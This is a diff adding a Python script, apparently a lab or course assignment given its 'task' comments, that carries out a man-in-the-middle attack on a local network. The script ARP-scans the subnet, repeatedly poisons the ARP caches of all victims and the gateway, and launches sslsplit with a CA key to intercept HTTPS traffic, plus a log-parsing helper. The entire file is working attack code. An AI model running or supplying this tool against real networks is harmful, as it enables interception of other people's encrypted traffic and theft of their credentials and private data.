@@ -1,0 +1,64 @@
+#!/usr/bin/env python3
+
+import sys
+import time
+import netifaces
+import scapy.all as scapy
+import subprocess
+
+def mitm():
+	# (task 1)
+	interfaces = netifaces.interfaces()
+	enp0 = [inter for inter in interfaces if inter[:4] == 'enp0'][0]
+	info = netifaces.ifaddresses(enp0)[netifaces.AF_INET][0]
+	addr, netmask = info['addr'], info['netmask']
+	cidr = sum([bin(int(x)).count('1') for x in netmask.split('.')])
+	addr = addr + '/' + str(cidr)
+
+	arp = scapy.ARP(pdst=addr)
+	ether = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
+	packet = ether / arp
+	result = scapy.srp(packet, timeout=3, verbose=0)[0]
+
+	print('Available Devices')
+	print('-------------------------------------')
+	print('IP                  MAC             ')
+	print('-------------------------------------')
+	arp_table = {}
+	
+	gateway = netifaces.gateways()['default'][netifaces.AF_INET][0]
+	for sent, received in result:
+		if received.psrc != gateway and received.psrc != addr:
+			print(f'{received.psrc:20}{received.hwsrc:17}')
+		# do not store lo and dns server on arp_table.
+		if received.psrc != '10.0.2.2' and received.psrc != '10.0.2.3':
+			arp_table[received.psrc] = received.hwsrc
+
+	# (task 2) ARP spoofing
+	for victim_ip in arp_table:
+		if victim_ip == gateway:
+			continue
+		packet = scapy.ARP(op=2, pdst=victim_ip, hwdst=arp_table[victim_ip], psrc=gateway)
+		scapy.send(packet, verbose=False)
+		packet = scapy.ARP(op=2, pdst=gateway, hwdst=arp_table[gateway], psrc=victim_ip)
+		scapy.send(packet, verbose=False)
+	
+	# (task 3)	
+	subprocess.Popen(["sslsplit","-d", "-S", "logfile","-p", "sslsplit.pid", "-k", "ca.key", "-c", "ca.crt", "https", "0.0.0.0", "8443"])
+	subprocess.Popen(["./mitm_parse.sh"])
+	# ARP spoofing 
+	while True:	
+		try:
+			time.sleep(5)
+			for victim_ip in arp_table:
+				if victim_ip == gateway:
+					continue
+				packet = scapy.ARP(op=2, pdst=victim_ip, hwdst=arp_table[victim_ip], psrc=gateway)
+				scapy.send(packet, verbose=False)
+				packet = scapy.ARP(op=2, pdst=gateway, hwdst=arp_table[gateway], psrc=victim_ip)
+				scapy.send(packet, verbose=False)
+		except KeyboardInterrupt:
+			exit(0)
+
+if __name__ == '__main__':
+	mitm()
